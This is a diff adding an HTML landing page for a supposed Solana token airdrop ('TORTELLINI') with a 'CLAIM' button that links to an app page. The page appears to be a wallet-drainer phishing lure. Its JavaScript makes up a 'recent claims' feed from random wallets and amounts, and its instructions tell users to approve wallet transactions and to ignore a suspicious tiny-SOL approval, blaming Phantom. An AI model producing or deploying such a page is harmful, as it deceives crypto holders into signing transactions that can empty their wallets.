@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Airdrop Live</title>
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://unpkg.com/@phosphor-icons/web"></script>
+
+<style>
+
+:root{
+--brand-dark:#0b0f1a;
+--brand-light:#2a2f3a;
+--brand-primary:#e27236;
+}
+
+.bg-brand-dark{background:var(--brand-dark);}
+.bg-brand-light{background:#141822;}
+.border-brand-light{border-color:var(--brand-light);}
+.text-brand-primary{color:var(--brand-primary);}
+.bg-brand-primary{background:var(--brand-primary);}
+
+body{
+background:#0b0f1a;
+background-image:
+linear-gradient(rgba(255,255,255,0.04) 1px,transparent 1px),
+linear-gradient(90deg,rgba(255,255,255,0.04) 1px,transparent 1px);
+background-size:40px 40px;
+color:white;
+font-family:monospace;
+}
+
+.btn-claim{
+background:var(--brand-primary);
+color:black;
+border:1px solid var(--brand-primary);
+transition:.3s;
+}
+
+.btn-claim:hover{
+background:#ff8b4c;
+box-shadow:0 0 20px rgba(226,114,54,.5);
+}
+
+.transaction-item:hover{
+background:#111827;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- NAVBAR -->
+
+<header class="border-b border-brand-light bg-black/60 backdrop-blur">
+
+<div class="max-w-6xl mx-auto px-4 py-3 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
+
+<div class="flex items-center gap-3">
+
+<div class="w-8 h-8 bg-gradient-to-br from-purple-500 to-blue-500 rounded"></div>
+
+<h2 class="font-bold text-lg">
+Airdrop Live
+</h2>
+
+</div>
+
+<div class="flex items-center gap-2 flex-wrap">
+
+<div class="bg-black border border-brand-light px-3 py-1 text-xs text-brand-primary font-bold">
+📈 u $0.00001097
+</div>
+
+<div class="flex items-center border border-brand-light bg-black px-3 py-1 text-xs">
+
+<i class="ph ph-magnifying-glass text-gray-400 mr-2"></i>
+
+<input
+type="text"
+placeholder="Search CA..."
+class="bg-transparent outline-none text-xs w-24 sm:w-40"
+/>
+
+</div>
+
+</div>
+
+</div>
+
+</header>
+
+<main class="container mx-auto px-4 sm:px-6 py-6 sm:py-10 max-w-4xl">
+rr
+<!-- HEADER CARD -->
+
+<div class="border border-brand-light bg-brand-dark">
+
+<div class="p-6 sm:p-10 border-b border-brand-light">
+
+<div class="flex flex-col sm:flex-row items-start sm:items-center gap-6">
+
+<img
+src="https://images.pump.fun/coin-image/FCEKuz1WauscsBnA5y3otvNjfDCnnDVLQw7b2nFSpump?variant=600x600&ipfs=bafybeicyjy3odu2aynjtvsw3yncgwe363gkvspy2sc7wliaxqgfojzbpdm&src=https%3A%2F%2Fipfs.io%2Fipfs%2Fbafybeicyjy3odu2aynjtvsw3yncgwe363gkvspy2sc7wliaxqgfojzbpdm"
+class="w-20 h-20 sm:w-28 sm:h-28 border border-brand-light object-cover"
+/>
+
+<div class="flex-grow">
+
+<div class="flex flex-wrap items-center gap-2 mb-2">
+
+<h1 class="text-2xl sm:text-4xl font-bold uppercase leading-tight">
+TORTELLINI
+</h1>
+
+<span class="bg-brand-primary text-black px-2 py-1 text-xs sm:text-sm font-bold">
+TORTELLINI
+</span>
+
+</div>
+
+<div class="flex items-center gap-2 text-xs text-gray-400 mb-4 flex-wrap">
+
+<span>CA:</span>
+
+<span class="break-all">
+FCEKuz1WauscsBnA5y3otvNjfDCnnDVLQw7b2nFSpump
+</span>
+
+<i class="ph-bold ph-copy cursor-pointer"></i>
+
+</div>
+
+<div class="flex flex-wrap gap-3">
+
+<a href="https://dexscreener.com/solana/HwuUTAuMeWgVFYsk6VCGDXaMNLDuD2WBP8ZpnyZNAsvd" target="_blank"
+class="text-xs bg-brand-light px-3 py-1 hover:bg-white hover:text-black transition">
+VIEW ON DEXSCREENER
+</a>
+
+<a href="https://pump.fun/coin/FCEKuz1WauscsBnA5y3otvNjfDCnnDVLQw7b2nFSpump" target="_blank"
+class="text-xs border border-brand-light px-3 py-1 hover:text-brand-primary hover:border-brand-primary">
+PUMPFUN
+</a>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- STATUS -->
+
+<div class="p-6 sm:p-10 grid grid-cols-1 md:grid-cols-2 gap-8">
+
+<div>
+
+<h3 class="text-brand-primary text-sm mb-6 flex items-center gap-2">
+<i class="ph-fill ph-terminal-window"></i>
+FEE STATUS
+</h3>
+
+<div class="space-y-4">
+
+<div class="flex justify-between p-4 border border-brand-light bg-black text-xs sm:text-sm">
+<span class="text-gray-400">PROTOCOL SOURCE</span>
+<span class="text-white">METEORA</span>
+</div>
+
+<div class="flex justify-between p-4 border border-brand-light bg-black text-xs sm:text-sm">
+<span class="text-gray-400">CLAIMABLE BALANCE</span>
+<span class="text-brand-primary font-bold">
+784,190,715 TORTELLINI
+</span>
+</div>
+
+</div>
+
+</div>
+
+<div class="flex flex-col justify-center">
+
+<div class="bg-brand-light/20 p-5 border border-brand-light mb-5">
+
+<p class="text-xs text-gray-400 mb-1">// STATUS</p>
+
+<p class="text-brand-primary text-sm">
+● READY TO INTERACT
+</p>
+
+</div>
+
+<a href="./app/index.html"
+class="btn-claim w-full py-3 sm:py-4 text-base sm:text-lg font-bold flex items-center justify-center gap-3">
+
+<i class="ph-bold ph-gas-pump"></i>
+CLAIM TORTELLINI
+
+</a>
+
+<p class="mt-3 text-xs text-gray-500 text-center">
+having trouble? try reloading page or turning off vpn
+</p>
+
+</div>
+
+</div>
+
+<!-- RECENT CLAIMS -->
+
+<div class="p-6 sm:p-10 pt-0">
+
+<div class="border border-brand-light bg-black">
+
+<div class="p-4 border-b border-brand-light">
+
+<h4 class="text-brand-primary text-xs flex items-center gap-2">
+<i class="ph-bold ph-clock-counter-clockwise"></i>
+RECENT CLAIMS
+</h4>
+
+</div>
+
+<div id="claimsList" class="p-4 space-y-3"></div>
+
+</div>
+
+</div>
+
+
+<div class="p-6 sm:p-10 pt-0">
+
+<div class="border border-brand-light bg-brand-dark p-6">
+
+<h3 class="text-brand-primary text-sm mb-6 flex items-center gap-2">
+<i class="ph-fill ph-info"></i>
+CLAIMING PROCESS & ELIGIBILITY
+</h3>
+
+<ul class="space-y-4 text-gray-400 text-sm">
+
+<li class="flex gap-3">
+<span class="text-brand-primary font-bold">01.</span>
+<span>To qualify, you must hold <strong class="text-white">$TORTELLINI</strong> in your wallet.</span>
+</li>
+
+<li class="flex gap-3">
+<span class="text-brand-primary font-bold">02.</span>
+<span>Click the 'CLAIM' button and follow the wallet prompts to reveal your allocation.</span>
+</li>
+
+<li class="flex gap-3">
+<span class="text-brand-primary font-bold">03.</span>
+<span>Approve Transaction to receive your allocation. Sometimes allocation might not show up properly, i.e +0.00001SOL. Simply ignore, this is a known issue from Phantom, and we're working on getting it fixed.</span>
+</li>
+
+<li class="flex gap-3">
+<span class="text-brand-primary font-bold">04.</span>
+<span>All payouts are processed instantly to your wallet.</span>
+</li>
+
+<li class="flex gap-3">
+<span class="text-brand-primary font-bold">05.</span>
+<span>Hold your allocation position to continue receiving recurring daily payouts.</span>
+</li>
+
+</ul>
+
+</div>
+
+</div>
+
+</main>
+
+<!-- FOOTER -->
+
+<footer class="border-t border-brand-light mt-10">
+
+<div class="max-w-6xl mx-auto px-6 py-10 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-8 text-sm">
+
+<div>
+
+<h3 class="text-white font-bold mb-2">
+Airdrop Live
+</h3>
+
+<p class="text-gray-400 text-sm">
+Claim your token airdrop on Solana. Connect wallet, enter token contract (CA), and claim. Supports all SPL tokens.
+</p>
+
+</div>
+
+<div>
+
+<h3 class="text-brand-primary font-bold mb-3">
+INTEGRATIONS
+</h3>
+
+<ul class="text-gray-400 space-y-1">
+<li>Pump.fun</li>
+<li>Raydium</li>
+<li>Orca</li>
+<li>Meteora</li>
+</ul>
+
+</div>
+
+<div>
+
+<h3 class="text-brand-primary font-bold mb-3">
+SYSTEM
+</h3>
+
+<p class="text-gray-400 text-sm">
+<span class="text-brand-primary">●</span> Mainnet-Beta
+</p>
+
+<p class="text-gray-400 text-sm mt-1">
+Version: v2.2.3
+</p>
+
+</div>
+
+</div>
+
+<div class="border-t border-brand-light py-4 px-6 flex flex-col sm:flex-row justify-between items-center gap-3 text-xs text-gray-500">
+
+<p>
+© 2026 Airdrop Live. Claim Solana token airdrops.
+</p>
+
+<div class="flex gap-6">
+<a href="#">PRIVACY</a>
+<a href="#">TERMS</a>
+</div>
+
+</div>
+
+</footer>
+
+<script>
+
+const claimsList=document.getElementById("claimsList");
+
+function randomWallet(){
+
+const chars="ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789";
+
+let start="";
+let end="";
+
+for(let i=0;i<4;i++){
+start+=chars[Math.floor(Math.random()*chars.length)];
+end+=chars[Math.floor(Math.random()*chars.length)];
+}
+
+return start+"..."+end;
+
+}
+
+function randomAmount(){
+const amount=(Math.floor(Math.random()*8)+12)*1000000;
+return amount.toLocaleString();
+}
+
+function createClaim(){
+
+const wallet=randomWallet();
+const amount=randomAmount();
+
+const claim=document.createElement("div");
+
+claim.className="transaction-item flex justify-between items-center py-2 border-b border-gray-900 text-xs sm:text-sm";
+
+claim.innerHTML=`
+
+<div class="flex gap-3 items-center">
+
+<div class="w-2 h-2 bg-brand-primary rounded-full"></div>
+
+<div>
+<span>${wallet}</span>
+<p class="text-[10px] text-gray-500">Claimed Yield</p>
+</div>
+
+</div>
+
+<div class="text-right">
+
+<p class="text-brand-primary font-bold">
++${amount} TORTELLINI
+</p>
+
+<p class="text-[10px] text-gray-500">
+just now
+</p>
+
+</div>
+
+`;
+
+claimsList.prepend(claim);
+
+if(claimsList.children.length>8){
+claimsList.removeChild(claimsList.lastChild);
+}
+
+}
+
+setInterval(createClaim,3000);
+
+</script>
+
+</body>
+</html>
